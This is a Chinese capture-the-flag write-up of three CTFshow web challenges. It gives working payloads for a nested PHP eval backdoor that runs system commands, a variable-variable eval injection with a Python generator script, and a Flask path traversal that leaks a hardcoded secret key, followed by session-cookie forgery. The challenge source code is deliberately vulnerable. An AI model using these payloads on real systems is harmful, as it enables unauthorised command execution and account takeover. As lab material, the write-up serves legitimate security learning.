# 1、web 签到
---
```php
<?php  
	error_reporting(0);  
	highlight_file(__FILE__);  
  
	eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
?>
```

- 首先，我们要理解这些 php 代码，虽然嵌套了很多层，但只要层层细细分析，还是能解出来的。  
- 先看最里面的 `$_COOKIE['CTFshow-QQ群:']`，那么这里获取的就是 cookie 中“`CTFshow-QQ群:`”指向的值，如果我们将 `CTFshow-QQ群:` 对应的值设置为 a，整个语句就会变为 `$_REQUEST[$_GET[$_POST[a]]]`。  
- 那么 `$_POST[a]` 就是以 POST 方式传入 a 参数的值，我们可以设置为 `a=b`，于是语句就变为 `$_REQUEST[$_GET[b]]`。  
- 那么 `$_GET[b]` 同理，只不过用到的是 GET 方法来传入 b 参数的值，我们可以设置为 `/?b=c`，那么语句就变为 `$_REQUEST[c][6][0][7][5][8][0][9][4][4]`。  
- `$_REQUEST` 可以是任意一种方法，c 则是数组，该请求传入的值是取的 c 数组中 ID 键为 \[6\]\[0\]\[7\]\[5\]\[8\]\[0\]\[9\]\[4\]\[4\] 的值，因为 php 数组可以指定 ID 键分配值的，那么我们就可以直接对其赋值。  
- 还有要注意 url 中的编码问题！  

```
https://xxx/?b=c&c[6][0][7][5][8][0][9][4][4]=system("ls /")
https://xxx/?b=c&c[6][0][7][5][8][0][9][4][4]=system("cat /f1agaaa")

POST: a=b
COOKIE: CTFshow-QQ群:=a
```

# 2、我的眼里只有$
---
```php
<?php
	error_reporting(0);
	highlight_file(__FILE__);
	extract($_POST);
	eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
?>
```

- 考点是 $ 的多重取值。  
- 分析代码我们可以看到有 36 个 $，于是我们要构造 36 层取值，且第一层必须是“\_”。  
- 我们可以用 python 来构造 payload。  

```python
text = '_'

for i in range(0,35):
    if i == 0:
        text = text + '=' + '_' + str(i)
    else:
        text = text + '_' + str(i-1) + '=_' + str(i)
        
    if i != 34:
         text = text + '&'
print(text)
```

- 在输出结果后接上 `&_34=system('xxx');` 即可，其中 `xxx` 可以是任意命令。  
- 注意编码问题！

# 3、抽老婆
---
- 通过查看网页源代码可知，用 GET 传递 `/download?file=xxx` 可以下载文件，当然直接下载 flag. Txt 是不行的，在尝试过后，网站出现报错。
- 查看报错，发现网站好像是用 python 搭的，那就应该用到了 flask 框架，再加上看到熟悉的 session，我猜到了应该是要伪造 session 了。
- 保险起见，可以下载源码来看看。
```
https://xxx/download?file=/../../app.py
```
- 得到以下代码：
```python
from flask import *
import os
import random
from flag import flag
  
#初始化全局变量
app = Flask(__name__)
app.config['SECRET_KEY'] = 'tanji_is_A_boy_Yooooooooooooooooooooo!' 


@app.route('/', methods=['GET'])
def index():  
    return render_template('index.html')  


@app.route('/getwifi', methods=['GET'])
def getwifi():
    session['isadmin']=False
    wifi=random.choice(os.listdir('static/img'))
    session['current_wifi']=wifi
    return render_template('getwifi.html',wifi=wifi)


@app.route('/download', methods=['GET'])
def source():
    filename=request.args.get('file')
    if 'flag' in filename:
        return jsonify({"msg":"你想干什么？"})
    else:
        return send_file('static/img/'+filename,as_attachment=True)


@app.route('/secret_path_U_never_know',methods=['GET'])
def getflag():
    if session['isadmin']:
        return jsonify({"msg":flag})
    else:
        return jsonify({"msg":"你怎么知道这个路径的？不过还好我有身份验证"})


if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=True)
```
- 在源代码中 secret key 也给了出来，那就直接开始伪造吧。
```bash
python3 flask-session-cookie-manager3.py encode -s "Sercret_Key" -t "{'current_wifi': 'c1c437b721d6dcc27ccf4cb8412bd5b6.jpg', 'isadmin': True}"
```
- 修改完 cookie 之后，再去访问源代码中的特定路径，就能得到 Flag 了。